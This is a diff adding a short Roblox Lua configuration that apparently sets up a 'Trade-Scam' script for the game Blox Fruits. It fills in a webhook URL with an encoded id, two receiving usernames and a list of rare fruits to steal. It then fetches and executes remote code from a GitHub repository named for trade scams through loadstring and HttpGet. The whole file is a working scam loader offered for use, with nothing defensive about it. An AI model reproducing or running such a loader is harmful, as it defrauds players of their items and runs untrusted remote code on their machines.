@@ -1,0 +1,5 @@
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=Q3NzS3RkbWs3eVRXZ1lDZmpIcHdhZzo5RERLY01fQWNTODFDMEdNbm16eWtNSllmaVpzWmt4VG5OZUR2Z290QTdVanZqTVpXSldCLUdkanA1eGpMcG14bWdUSmFJcG9WT25EbXpRdG5ueVpJMHFrdDEzWnZMZ0Z3U3BEdjRoZU82bFJYZHZLU2J6dzhlemNmRmd2dVg0d2g2cFBFQkxZT0g5STlQTnlXT2VoRXloYVByZzJCNm1idGJDMFRnazhMNkE" -- << Your Webhook
+Usernames = {"Yxrz_21", "Starringnight21"} -- << Your username(-s).
+FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas", "Gravity-Gravity", "Spirit-Spirit", "Dough-Dough", "T-rex-T-rex"} -- << Fruits you want
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TradeScam-Script-redz/RealRedz-Script/refs/heads/main/Trade-Scam"))()
